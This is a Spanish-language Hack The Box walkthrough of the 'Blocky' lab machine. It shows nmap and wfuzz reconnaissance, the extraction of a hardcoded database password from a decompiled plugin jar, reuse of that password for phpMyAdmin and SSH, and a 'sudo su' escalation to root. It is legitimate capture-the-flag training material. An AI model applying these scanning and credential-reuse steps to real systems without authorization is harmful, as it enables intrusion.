---
title: Hack The Box Blocky
author: k4miyo
date: 2022-03-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [PHP]
ping: true
---

## Blocky
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.37.

```bash
❯ ping -c 1 10.10.10.37
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=135 ms

--- 10.10.10.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 134.893/134.893/134.893/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 12:18 CST
Initiating SYN Stealth Scan at 12:18
Scanning 10.10.10.37 [65535 ports]
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 25565/tcp on 10.10.10.37
Completed SYN Stealth Scan at 12:18, 26.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.37
Host is up, received user-set (0.14s latency).
Scanned at 2022-03-18 12:18:13 CST for 26s
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 24 (1.052KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 125 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.37
   5   │     [*] Open ports: 21,22,80,25565
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,22,80,25565 10.10.10.37 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 12:19 CST
Nmap scan report for 10.10.10.37
Host is up (0.14s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

Primeramente, vemos que el puerto 21 se encuentra abierto, así que trataremos de conectarnos como el usuario **anonymous** sin proporcionar contraseña.

```bash
❯ ftp 10.10.10.37
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:k4miyo): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> exit
221 Goodbye.
```

No podemos ingresar, asi que ahora, antes de visualizar el contenido vía web, vamos a ocupar la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.37/
http://10.10.10.37/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```

Tenemos que nos enfrentamos ante un **WordPress**. Ahora si podemos ver el contenido vía web:

![](/assets/images/htb-blocky/blocky-web.png)

Navengado un poco en el sitio, encontramos una publicación del usuario **notch** el cual podría ser un potencial dato a tomar en cuenta.

![](/assets/images/htb-blocky/blocky-web1.png)

Ahora vamos a tratar de descubrir rutas dentro del servidor de las cuales podemos obtener información.

```bash
❯ nmap --script http-enum -p80 10.10.10.37
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 12:22 CST
Nmap scan report for 10.10.10.37
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wiki/: Wiki
|   /wp-login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
```

Aquí `nmap` nos reporta el panel de login de **WordPress** bajo la ruta `/wp-login.php`; con esto, podemos validar si el usuario que hemos identificado existe.

![](/assets/images/htb-blocky/blocky-web2.png)

Vemos que el usurio existe. Como `nmap` prueba con pocas rutas, vamos a irnos algo más tochos y lo haremos con `wfuzz`:

```bash
❯ wfuzz -c --hc=404 --hw=3592 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.37/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.37/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000190:   301        9 L      28 W       309 Ch      "wiki"                                                          
000000241:   301        9 L      28 W       315 Ch      "wp-content"                                                    
000000519:   301        9 L      28 W       312 Ch      "plugins"                                                       
000000786:   301        9 L      28 W       316 Ch      "wp-includes"                                                   
000001073:   301        9 L      28 W       315 Ch      "javascript"                                                    
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 31.54087
Processed Requests: 1367
Filtered Requests: 1362
Requests/sec.: 43.34058
```

Tenemos un recurso interesante, `/plugins`, asi que vamos a echarle un ojo:

![](/assets/images/htb-blocky/blocky-web3.png)

Tenemos dos recursos, que al hacerles *hovering* vemos que se encuentran en `/plugins/files`:

![](/assets/images/htb-blocky/blocky-web4.png)

Vamos a descargarlos anuestra máquina y como vemos que es un archivo **.jar**, significa que es un comprimido, por lo tanto podemos descomprmirlo (analizaremos solo BlockyCore.jar).

```bash
❯ unzip BlockyCore.jar -d BlockyCore
Archive:  BlockyCore.jar
  inflating: BlockyCore/META-INF/MANIFEST.MF  
  inflating: BlockyCore/com/myfirstplugin/BlockyCore.class
❯ ll
drwxr-xr-x root   root    22 B Fri Mar 18 12:49:48 2022  BlockyCore
.rw-r--r-- k4miyo k4miyo 883 B Fri Mar 18 12:47:59 2022  BlockyCore.jar
❯ tree
.
├── BlockyCore
│   ├── com
│   │   └── myfirstplugin
│   │       └── BlockyCore.class
│   └── META-INF
│       └── MANIFEST.MF
└── BlockyCore.jar

4 directories, 3 files
```

Aqui ya vemos el archivo `BlockyCore.class`, así que vamos a visualizarlo con al herramienta `javap`:

```bash
❯ cd BlockyCore/com/myfirstplugin
❯ ll
.rw-r--r-- root root 939 B Sun Jul  2 11:11:50 2017  BlockyCore.class
❯ javap -c BlockyCore
Warning: File ./BlockyCore.class does not contain class BlockyCore
Compiled from "BlockyCore.java"
public class com.myfirstplugin.BlockyCore {
  public java.lang.String sqlHost;

  public java.lang.String sqlUser;

  public java.lang.String sqlPass;

  public com.myfirstplugin.BlockyCore();
    Code:
       0: aload_0
       1: invokespecial #12                 // Method java/lang/Object."<init>":()V
       4: aload_0
       5: ldc           #14                 // String localhost
       7: putfield      #16                 // Field sqlHost:Ljava/lang/String;
      10: aload_0
      11: ldc           #18                 // String root
      13: putfield      #20                 // Field sqlUser:Ljava/lang/String;
      16: aload_0
      17: ldc           #22                 // String 8YsqfCTnvxAUeduzjNSXe22
      19: putfield      #24                 // Field sqlPass:Ljava/lang/String;
      22: return

  public void onServerStart();
    Code:
       0: return

  public void onServerStop();
    Code:
       0: return

  public void onPlayerJoin();
    Code:
       0: aload_0
       1: ldc           #33                 // String TODO get username
       3: ldc           #35                 // String Welcome to the BlockyCraft!!!!!!!
       5: invokevirtual #37                 // Method sendMessage:(Ljava/lang/String;Ljava/lang/String;)V
       8: return

  public void sendMessage(java.lang.String, java.lang.String);
    Code:
       0: return
}
```

Vemos una cadena medio extraña `8YsqfCTnvxAUeduzjNSXe22` la cual podría estar asociada a una contraseña debido a que en la descripción, hace referencia a **sqlPass**; ahora podriamos tratar de autenticarnos en los paneles de login que tenemos bajo las rutas `wp-login.php`, `phpmyadmin` e incluso; si el usuario **notch** existe a nivel de sistema, podríamos tratar de conectarnos vía ssh.

Al validar la contraseña, vemos que podemos acceder a `phpmyadmin` con las credenciales **root : 8YsqfCTnvxAUeduzjNSXe22** y que también podemos acceder vía ssh con **notch : 8YsqfCTnvxAUeduzjNSXe22**.

![](/assets/images/htb-blocky/blocky-web5.png)

```bash
❯ ssh notch@10.10.10.37
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$ whoami
notch
notch@Blocky:~$
```

Para este caso, utilizaremos el acceso obtenido por ssh y ya dentro de la máquina como el usuario **notch** podemos visualizar la flag (user.txt). Ahora debemos encontrar una forma de escalar privilegios.

```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
notch@Blocky:~$
```

Nos encontramos en el grupo **sudo** y además contamos con las credenciales del usuario **notch**; por lo tanto ya podemos convertirnos en **root**:

```bash
notch@Blocky:~$ sudo su
[sudo] password for notch: 
root@Blocky:/home/notch# whoami
root
root@Blocky:/home/notch#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
